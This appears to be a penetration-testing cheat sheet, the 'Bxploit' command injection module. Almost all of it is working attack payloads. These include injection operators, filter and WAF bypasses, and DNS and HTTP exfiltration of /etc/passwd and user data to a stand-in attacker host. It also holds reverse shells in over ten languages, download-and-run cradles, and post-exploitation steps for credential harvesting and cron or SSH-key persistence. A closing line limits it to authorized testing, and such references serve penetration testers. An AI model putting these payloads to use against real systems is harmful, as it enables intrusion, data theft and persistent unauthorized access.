# Command Injection & OS Command Complete Arsenal

> Bxploit Knowledge Module — Command Injection, OS Command Execution, Reverse Shells, Blind Detection, Exfiltration

## Overview

Command injection occurs when user-controlled input is passed unsanitized into OS command execution functions (`system()`, `exec()`, `popen()`, `shell_exec()`, backticks, `subprocess.Popen(shell=True)`, `os.system()`, `Runtime.exec()`, etc.). This module covers every practical vector: inline injection, blind detection, data exfiltration, reverse shells across 8+ languages, argument injection, and environment variable abuse.

---

## 1. Injection Operators & Special Characters

Every operator that lets you chain, substitute, or redirect commands on the target OS.

### 1.1 Linux / Bash Operators

```bash
# Semicolon — sequential execution regardless of prior exit code
; whoami
;id

# Pipe — stdout of left feeds stdin of right
| whoami
| cat /etc/passwd

# AND — second runs only if first succeeds (exit 0)
&& whoami
&& id

# OR — second runs only if first fails (non-zero exit)
|| whoami
|| id

# Background — run in background, both execute
& whoami
& id &

# Newline — treated as command separator
%0a whoami
%0a id

# Backtick substitution — inner command runs first, output replaces inline
`whoami`
`id`

# Dollar-paren substitution — same as backticks, nestable
$(whoami)
$(id)

# Dollar-brace variable expansion
${IFS}  # acts as space/tab/newline separator
${PATH}

# Redirection to overwrite / append files
; echo hacked > /tmp/pwned
; echo hacked >> /tmp/pwned

# Here-string injection (bash-specific)
<<< $(whoami)

# Process substitution
<(whoami)
>(cat /etc/passwd)

# Brace expansion
{whoami,id}
```

### 1.2 Windows / CMD Operators

```cmd
& whoami
&& whoami
|| whoami
| whoami

# Newline variants (URL-encoded)
%0a whoami
%0d%0a whoami

# Caret escape (CMD escape character)
w^h^o^a^m^i

# Variable substitution
%USERNAME%
%COMPUTERNAME%
%OS%

# FOR loop execution
& for /f %i in ('whoami') do echo %i
```

### 1.3 PowerShell Operators

```powershell
; whoami
| whoami
&& whoami          # PowerShell 7+
|| whoami          # PowerShell 7+

# Subexpression
$(whoami)

# Invoke-Expression
IEX("whoami")
Invoke-Expression "whoami"

# Call operator
& whoami
& {whoami}

# Encoded command execution
powershell -enc <base64_payload>

# Script block invocation
.{whoami}
& {whoami}
```

---

## 2. Basic Command Injection Payloads

Payloads sorted by injection context. Assume the vulnerable parameter is inserted into a command like `ping -c 1 <USER_INPUT>`.

### 2.1 Inline Injection (Result Visible)

```bash
# Simple chaining
127.0.0.1; whoami
127.0.0.1; cat /etc/passwd
127.0.0.1 | id
127.0.0.1 && uname -a
127.0.0.1 || id

# Substitution-based
127.0.0.1$(whoami)
127.0.0.1`whoami`
$(cat /etc/passwd)

# Newline-based (URL-encoded in HTTP)
127.0.0.1%0aid
127.0.0.1%0d%0aid
127.0.0.1%0awhoami

# Double-encoding
127.0.0.1%250aid
127.0.0.1%250awhoami
```

### 2.2 Quoted Context Breakout

When input is placed inside quotes in the command:

```bash
# Inside double quotes: "; whoami; echo "
"; whoami; echo "
"; whoami; #
"$(whoami)"
"`whoami`"

# Inside single quotes — cannot use substitution, must break out
'; whoami; echo '
'; whoami; #

# Backtick inside double quotes (still executes)
"`id`"
```

### 2.3 Filename / Path Context

When input is used as a filename argument:

```bash
# Abuse glob or inject after filename
file.txt; whoami
file.txt | id
file.txt$(whoami)
file.txt`id`
```

---

## 3. Blind Command Injection

No output is returned to the attacker. Detection relies on side-channel signals.

### 3.1 Time-Based Detection

```bash
# Sleep-based — observe response time delta
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
& sleep 5 &
; sleep 10 #
%0a sleep 5 %0a

# Conditional sleep (confirms command execution context)
; if [ $(whoami) = "root" ]; then sleep 10; fi
; [ -f /etc/passwd ] && sleep 5

# Ping-based timing (5 ICMP = ~5s)
; ping -c 5 127.0.0.1
| ping -c 10 127.0.0.1

# Windows time-based
& ping -n 10 127.0.0.1
& timeout /t 5
& powershell Start-Sleep -s 5
```

### 3.2 DNS-Based Exfiltration (Out-of-Band)

Exfiltrate data through DNS lookups to an attacker-controlled domain. Use Burp Collaborator, interactsh, or your own NS.

```bash
# Basic DNS exfil — whoami
; nslookup $(whoami).ATTACKER.com
; host $(whoami).ATTACKER.com
; dig $(whoami).ATTACKER.com
; ping -c 1 $(whoami).ATTACKER.com

# Multi-field exfil
; nslookup $(whoami)-$(hostname).ATTACKER.com
; dig $(uname -a | base32 | head -c 60).ATTACKER.com

# /etc/passwd exfil line-by-line
; for line in $(cat /etc/passwd | head -5); do dig $(echo $line | base64 | tr '+/=' '-_0').ATTACKER.com; done

# File content via DNS (hex-encoded, chunked)
; xxd -p /etc/hostname | head -c 60 | xargs -I{} dig {}.ATTACKER.com

# curl/wget-based OOB (HTTP exfil, not DNS, but commonly grouped)
; curl http://ATTACKER.com/$(whoami)
; wget http://ATTACKER.com/$(cat /etc/passwd | base64 | tr -d '\n') -O /dev/null
; curl http://ATTACKER.com/?d=$(id|base64)
```

### 3.3 File-Write Confirmation

```bash
# Write a marker file, then retrieve via another vuln or known path
; echo PWNED > /var/www/html/proof.txt
; cp /etc/passwd /var/www/html/passwd.txt
; touch /tmp/pwned_$(date +%s)

# Write to webroot for HTTP retrieval
; whoami > /var/www/html/cmd_output.txt
```

---

## 4. Filter Bypass & Evasion Techniques

### 4.1 Space Bypass

When spaces are filtered or stripped:

```bash
# $IFS (Internal Field Separator, default space/tab/newline)
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
cat${IFS}'/etc/passwd'

# Tab character (%09 URL-encoded)
;cat%09/etc/passwd

# Brace expansion (no spaces needed)
{cat,/etc/passwd}
{ls,-la,/tmp}

# Input redirection
cat</etc/passwd

# ANSI-C quoting
X=$'\x20';cat${X}/etc/passwd

# Variable assignment
IFS=,;`cat<<<cat,/etc/passwd`
```

### 4.2 Keyword/Command Blacklist Bypass

```bash
# Quote insertion (unquoted by shell)
w'h'o'am'i
w"h"o"am"i
/b'i'n/ca't' /e'tc'/pa'ss'wd

# Backslash insertion
w\h\o\a\m\i
c\a\t /e\t\c/p\a\s\s\w\d
/b\in/\c\a\t /\e\t\c/\p\a\s\s\w\d

# Concatenation via variables
a=wh;b=oam;c=i;$a$b$c
a=c;b=at;c=' /etc/passwd';$a$b$c

# Wildcard / glob
/b?n/ca? /et?/pas?wd
/b[i]n/c[a]t /e[t]c/p[a]sswd
/???/??t /???/??????

# Base64 encoded execution
echo d2hvYW1p | base64 -d | bash
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
bash<<<$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d)

# Hex-encoded execution
echo -e '\x77\x68\x6f\x61\x6d\x69' | bash
$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')

# Octal
$'\167\150\157\141\155\151'

# Rev (reverse string)
echo 'dimaohw' | rev | bash

# $0 trick (invokes default shell)
echo whoami | $0
```

### 4.3 Character Blacklist Bypass

```bash
# Slash (/) bypass
# Use environment variable
${HOME:0:1}   # yields /
${PATH:0:1}   # yields /
${PWD:0:1}    # yields /

# cat /etc/passwd without slash
cat ${HOME:0:1}etc${HOME:0:1}passwd

# Semicolon (;) bypass — use newline
%0a whoami
# Or use && or || or |

# Pipe (|) bypass — use $() or `` or temporary file
$(whoami > /tmp/x); cat /tmp/x

# Ampersand (&) bypass
%26 whoami
```

### 4.4 Length-Restricted Injection

When input length is limited:

```bash
# Staged payload — write in chunks
;echo PK>/t
;echo YXQ>>/t
;cat /t|base64 -d|sh

# Short exfil
;curl ATTACKER/$(id)
;wget ATTACKER/`id`

# Shortest possible (2–4 char commands)
;id
;ls
;ps
;w
```

---

## 5. Reverse Shell Generators

### 5.1 Bash Reverse Shells

```bash
# TCP
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Alternative with exec
exec 5<>/dev/tcp/ATTACKER_IP/PORT; cat <&5 | while read line; do $line 2>&5 >&5; done

# Bash with /dev/tcp redirect
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/PORT; sh <&196 >&196 2>&196

# Bash UDP
bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1

# sh with named pipe
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
```

### 5.2 Python Reverse Shells

```python
# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python 2/3 compatible
python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'

# Python with PTY (fully interactive)
python3 -c 'import pty,socket,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));[os.dup2(s.fileno(),i)for i in range(3)];pty.spawn("bash")'
```

### 5.3 Perl Reverse Shells

```perl
# Perl TCP
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Perl without /bin/sh
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"ATTACKER_IP:PORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### 5.4 PHP Reverse Shells

```php
# PHP exec
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# PHP proc_open
php -r '$sock=fsockopen("ATTACKER_IP",PORT);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'

# PHP system
php -r '$sock=fsockopen("ATTACKER_IP",PORT);while($cmd=fgets($sock)){$out=shell_exec($cmd);fwrite($sock,$out);}'

# PHP popen (one-way)
php -r 'popen("nc ATTACKER_IP PORT -e /bin/sh","r");'
```

### 5.5 Ruby Reverse Shells

```ruby
# Ruby TCP
ruby -rsocket -e 'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Ruby fork + exec
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ATTACKER_IP",PORT);loop{c.gets.chomp!;(IO.popen(($_),"r"){|io|c.print io.read})rescue(c.print $_+"\n")}'
```

### 5.6 Netcat Reverse Shells

```bash
# Traditional nc with -e (netcat-traditional)
nc -e /bin/sh ATTACKER_IP PORT
nc -e /bin/bash ATTACKER_IP PORT

# Netcat without -e (POSIX / OpenBSD nc)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f

# ncat (nmap's netcat) with SSL
ncat --ssl ATTACKER_IP PORT -e /bin/bash

# Netcat UDP
nc -u ATTACKER_IP PORT -e /bin/sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc -u ATTACKER_IP PORT >/tmp/f
```

### 5.7 Socat Reverse Shells

```bash
# Basic reverse shell
socat TCP:ATTACKER_IP:PORT EXEC:/bin/bash

# Fully interactive TTY reverse shell (best quality)
# Attacker listener:
socat file:`tty`,raw,echo=0 TCP-LISTEN:PORT

# Victim:
socat TCP:ATTACKER_IP:PORT EXEC:'bash -li',pty,stderr,setsid,sigint,sane

# Socat encrypted (OpenSSL)
# Generate cert: openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 30 -out shell.crt && cat shell.key shell.crt > shell.pem
# Attacker:
socat OPENSSL-LISTEN:PORT,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0
# Victim:
socat OPENSSL:ATTACKER_IP:PORT,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

### 5.8 PowerShell Reverse Shells

```powershell
# PowerShell TCP reverse shell
powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"

# PowerShell one-liner (encoded)
# Generate: echo -n 'IEX(New-Object Net.WebClient).DownloadString("http://ATTACKER/shell.ps1")' | iconv -t UTF-16LE | base64 -w0
powershell -enc <BASE64_PAYLOAD>

# PowerShell via download cradle
powershell IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')
powershell IEX(iwr http://ATTACKER_IP/shell.ps1 -UseBasicParsing)

# ConPTY shell (fully interactive on Windows)
IEX(IWR http://ATTACKER_IP/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell ATTACKER_IP PORT

# Nishang reverse shell
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port PORT
```

### 5.9 Other Language Reverse Shells

```bash
# Node.js
node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var c=new net.Socket();c.connect(PORT,"ATTACKER_IP",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});})()'

# Lua
lua -e 'local s=require("socket");local t=assert(s.tcp());t:connect("ATTACKER_IP",PORT);while true do local r,x=t:receive();local f=assert(io.popen(r,"r"));local b=assert(f:read("*a"));t:send(b);end;f:close();t:close();'

# Java/Groovy (Jenkins / webapp)
Runtime r = Runtime.getRuntime(); Process p = r.exec("/bin/bash -c bash$IFS-i>&/dev/tcp/ATTACKER_IP/PORT<&1"); p.waitFor();

# Groovy (Jenkins Script Console)
String host="ATTACKER_IP"; int port=PORT; String cmd="/bin/bash"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break}catch(Exception e){}};p.destroy();s.close();

# Golang
echo 'package main;import("os/exec";"net");func main(){c,_:=net.Dial("tcp","ATTACKER_IP:PORT");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/rs.go && go run /tmp/rs.go

# AWK
awk 'BEGIN {s="/inet/tcp/0/ATTACKER_IP/PORT";while(42){do{printf "$ " |& s;s |& getline c;if(c){while((c |& getline)>0)print $0 |& s;close(c)}}while(c!="exit");close(s)}}'

# OpenSSL encrypted reverse shell
# Attacker: openssl s_server -quiet -key key.pem -cert cert.pem -port PORT
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_IP:PORT > /tmp/s; rm /tmp/s
```

---

## 6. Argument Injection

Injecting into command arguments rather than breaking out of the command entirely. Exploits programs that interpret arguments as options.

### 6.1 Common Argument Injection Vectors

```bash
# Git argument injection (e.g., clone URL controlled by attacker)
--upload-pack='touch /tmp/pwned'
-c protocol.ext.allow=always --upload-pack='id>/tmp/pwned' ext::sh

# Curl argument injection
-o /var/www/html/shell.php http://ATTACKER/shell.php
--output /tmp/pwned -d @/etc/passwd http://ATTACKER/

# Wget argument injection
--post-file=/etc/passwd http://ATTACKER/
-O /var/www/html/shell.php http://ATTACKER/shell.php

# Tar argument injection (wildcard abuse)
# If `tar czf archive.tar.gz *` is run in a directory you control:
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' > shell.sh

# Find argument injection
-exec whoami ;
-exec cat /etc/passwd ;

# Zip / 7z
-T -TT 'whoami > /tmp/pwned'

# rsync argument injection
-e 'sh -c "whoami > /tmp/pwned"' .

# SSH argument injection
-o ProxyCommand='whoami > /tmp/pwned'

# Sendmail argument injection (PHP mail() classic)
-X/var/www/html/shell.php
-OQueueDirectory=/tmp -X/var/www/html/shell.php

# Less / more / man
!/bin/sh       # Interactive escape
```

### 6.2 Filename-Based Injection

Filenames crafted to exploit commands that process `*` (glob expansion):

```bash
# Classic tar wildcard injection
cd /tmp/controlled_dir
echo 'id > /tmp/proof' > shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
# When admin runs: tar czf backup.tar.gz *

# Classic chown/chmod wildcard injection
# In a dir where `chown user:group *` is run:
touch -- '--reference=/etc/shadow'

# Rsync wildcard abuse
touch -- '-e sh shell.sh'
```

---

## 7. Environment Variable Injection

Abusing environment variables to achieve command execution.

### 7.1 Classic Vectors

```bash
# LD_PRELOAD — force loading a malicious shared library
# Compile: gcc -shared -fPIC -o /tmp/evil.so evil.c -ldl
LD_PRELOAD=/tmp/evil.so /usr/bin/target_suid

# LD_LIBRARY_PATH — hijack shared library loading order
LD_LIBRARY_PATH=/tmp/evil_libs /usr/bin/target

# PATH hijacking — place malicious binary first in PATH
export PATH=/tmp:$PATH
echo '#!/bin/bash\nid > /tmp/pwned\n/usr/bin/real_command "$@"' > /tmp/targeted_command
chmod +x /tmp/targeted_command

# BASH_ENV — executed on non-interactive bash startup
BASH_ENV='$(whoami > /tmp/pwned)' bash -c 'echo test'

# ENV — executed by sh/dash/ash on startup
ENV='$(id > /tmp/pwned)' sh -c 'echo test'

# PS1 / PS4 prompt injection (if echoed or logged)
PS4='$(whoami > /tmp/pwned)' bash -x -c 'echo test'

# BASH_FUNC_ (ShellShock legacy concept — function export abuse)
# Not directly exploitable post-patch but conceptually relevant
env x='() { :;}; echo pwned' bash -c 'echo test'

# IFS manipulation — change word splitting
IFS='/' ; cmd="ls$IFS-la" ; $cmd

# PYTHONPATH injection (Python subprocess)
PYTHONPATH=/tmp/evil_modules python3 -c 'import os; os.system("id")'

# PERL5OPT / PERL5LIB
PERL5OPT='-e system("id")' perl -e1
PERL5LIB=/tmp/evil_lib perl target.pl

# NODE_OPTIONS
NODE_OPTIONS='--require /tmp/evil.js' node target.js

# RUBYOPT
RUBYOPT='-e system("id")' ruby -e 'puts 1'

# GIT_SSH_COMMAND
GIT_SSH_COMMAND='touch /tmp/pwned' git clone git@target:repo.git
```

### 7.2 CGI / Web-Specific Environment Injection

```bash
# HTTP_PROXY injection (SSRF via environment)
HTTP_PROXY=http://ATTACKER:8080/ curl http://internal-api/

# Proxy header injection (httpoxy vulnerability)
# Send header: Proxy: http://ATTACKER:8080/
# CGI sets HTTP_PROXY, libraries honor it for outbound requests

# SERVER_SOFTWARE, DOCUMENT_ROOT manipulation in misconfigured CGI
```

---

## 8. Language-Specific Dangerous Functions

Quick reference for auditing source code or crafting injection payloads.

### 8.1 PHP

```php
system($input);           // Direct execution, returns last line
exec($input, $output);    // Executes, fills $output array
shell_exec($input);       // Executes, returns full output
passthru($input);         // Executes, passes raw output
popen($input, "r");       // Opens process, returns file pointer
proc_open($input, ...);   // Full process control
pcntl_exec($input);       // Replaces current process
`$input`                  // Backtick operator = shell_exec()
preg_replace('/.*/e', $input, '');  // Deprecated /e modifier = eval
mail($to, $subj, $msg, $headers, "-X/path -OQueueDir=/tmp");  // 5th param injection
```

### 8.2 Python

```python
os.system(input)                              # Direct shell
os.popen(input)                               # Shell via popen
subprocess.call(input, shell=True)            # Explicit shell
subprocess.Popen(input, shell=True)           # Explicit shell
subprocess.run(input, shell=True)             # Explicit shell
commands.getoutput(input)                     # Python 2 only
eval(input)                                   # Python expression eval
exec(input)                                   # Python code execution
```

### 8.3 Node.js

```javascript
child_process.exec(input)                     // Shell execution
child_process.execSync(input)                 // Synchronous shell
child_process.spawn(input, {shell: true})     // Shell if shell:true
eval(input)                                   // JS eval
require('vm').runInNewContext(input)           // VM sandbox (escapable)
```

### 8.4 Java

```java
Runtime.getRuntime().exec(input);             // Direct execution
ProcessBuilder(input).start();                // Process builder
// Note: Java exec() does NOT use shell by default
// To get shell features: new String[]{"/bin/sh", "-c", input}
```

### 8.5 Ruby

```ruby
system(input)         # Executes in shell if single string
exec(input)           # Replaces process
`#{input}`            # Backtick interpolation
IO.popen(input)       # Opens pipe
Open3.capture3(input) # Captures stdout/stderr
%x(#{input})          # Same as backticks
Kernel.open("| #{input}")  # Pipe open
```

---

## 9. WAF Bypass & Advanced Evasion

### 9.1 Encoding Payloads

```bash
# URL encoding
%3B%20whoami                    # ; whoami
%7C%20id                        # | id
%26%26%20cat%20/etc/passwd      # && cat /etc/passwd

# Double URL encoding
%253B%2520whoami                # ; whoami (double-encoded)
%250a%2520id                    # \n id

# Unicode / UTF-8 normalization bypass
﹔whoami                         # fullwidth semicolon U+FE54
｜id                             # fullwidth vertical bar U+FF5C

# Hex in bash
$'\x63\x61\x74' $'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'

# Octal in bash
$'\143\141\164' $'\057\145\164\143\057\160\141\163\163\167\144'
```

### 9.2 Parameter Pollution / Parsing Confusion

```
# HTTP parameter pollution
GET /ping?ip=127.0.0.1&ip=;whoami

# JSON injection into command
{"host": "127.0.0.1\"; whoami; #"}
{"host": "127.0.0.1$(whoami)"}

# Header injection into logged/processed commands
User-Agent: () { :; }; /bin/bash -c 'whoami'
Referer: `whoami`
X-Forwarded-For: $(id)
```

### 9.3 Chained / Nested Evasion

```bash
# Nested substitution
$(echo$(echo ' ')whoami)

# Variable-based reconstruction
a=who;b=ami;$a$b

# Eval chain
eval $(echo 'd2hvYW1p' | base64 -d)

# Printf + execution
$(printf '\167\150\157\141\155\151')

# Bash history expansion (!!)
# After running a command, !! repeats it — context-dependent

# /proc-based execution (Linux)
/proc/self/exe -c 'id'
cat /proc/self/environ    # Leak environment

# Busybox (embedded / IoT / container)
busybox sh -c 'id'
busybox nc ATTACKER_IP PORT -e /bin/sh
```

---

## 10. Detection Checklist for Blind Testing

Systematic methodology for confirming blind OS command injection:

| Step | Technique | Payload | Observable Signal |
|------|-----------|---------|-------------------|
| 1 | Time delay (sleep) | `; sleep 5` | Response delayed ~5s |
| 2 | Time delay (ping) | `; ping -c 5 127.0.0.1` | Response delayed ~5s |
| 3 | DNS OOB | `; nslookup $(whoami).COLLABORATOR` | DNS query received |
| 4 | HTTP OOB | `; curl http://COLLABORATOR` | HTTP request received |
| 5 | File creation | `; touch /tmp/bxploit_test` | File exists check |
| 6 | Conditional delay | <code>; if id&#124;grep -q root; then sleep 10; fi</code> | Conditional timing |
| 7 | Arithmetic delay | <code>; sleep $(expr 3 + 2)</code> | 5s delay confirms math execution |

### Operator Iteration for Blind Detection

When testing, iterate through all operators systematically:

```
TARGET; sleep 5
TARGET| sleep 5
TARGET&& sleep 5
TARGET|| sleep 5
TARGET$(sleep 5)
TARGET`sleep 5`
TARGET%0asleep 5
TARGET& sleep 5 &
TARGET%0d%0asleep 5
```

---

## 11. Post-Exploitation After Command Injection

Once you have confirmed execution:

```bash
# 1. Identify context
whoami && id && hostname && uname -a && cat /etc/os-release

# 2. Network recon
ip a && ip route && cat /etc/resolv.conf && ss -tlnp

# 3. Interesting files
cat /etc/passwd && cat /etc/shadow 2>/dev/null && cat /etc/crontab
find / -perm -4000 -type f 2>/dev/null      # SUID binaries
find / -writable -type f 2>/dev/null | head -50

# 4. Credential harvesting
cat ~/.bash_history && env && cat /proc/self/environ
find / -name '*.conf' -exec grep -l 'pass' {} \; 2>/dev/null

# 5. Persistence
# Cron
echo '* * * * * bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' >> /var/spool/cron/crontabs/$(whoami)
# SSH key
mkdir -p ~/.ssh && echo 'ATTACKER_PUBKEY' >> ~/.ssh/authorized_keys

# 6. Upgrade to interactive shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
script -qc /bin/bash /dev/null
# Then Ctrl+Z, stty raw -echo; fg
```

---

## 12. Automation & Tooling

```bash
# Commix — automated command injection detection & exploitation
commix -u "http://TARGET/page?param=value"
commix -u "http://TARGET/page?param=value" --os-cmd="whoami"
commix -u "http://TARGET/page?param=value" --level=3
commix -u "http://TARGET/page" --data="param=value" --technique=T  # Time-based only
commix -u "http://TARGET/page?param=value" --batch --os=linux

# Burp Suite intruder — use command injection wordlists
# SecLists paths:
# /usr/share/seclists/Fuzzing/command-injection-commix.txt
# /usr/share/seclists/Fuzzing/FUZZ_SPECIAL_CHARS.txt
# /usr/share/seclists/Fuzzing/UnixAttacks.txt
# /usr/share/seclists/Fuzzing/command-injection/

# Custom ffuf fuzzing
ffuf -u "http://TARGET/api?cmd=FUZZ" -w /usr/share/seclists/Fuzzing/command-injection-commix.txt -mc all -fc 404

# Nuclei templates
nuclei -u http://TARGET -t command-injection/
```

---

## References

- OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection
- PayloadsAllTheThings — Command Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
- HackTricks — Command Injection: https://book.hacktricks.xyz/pentesting-web/command-injection
- Commix: https://github.com/commixproject/commix
- RevShells Generator: https://www.revshells.com/
- GTFOBins: https://gtfobins.github.io/

---

*Bxploit Knowledge Module — Command Injection & OS Command Complete Arsenal*
*For authorized security testing and educational purposes only.*
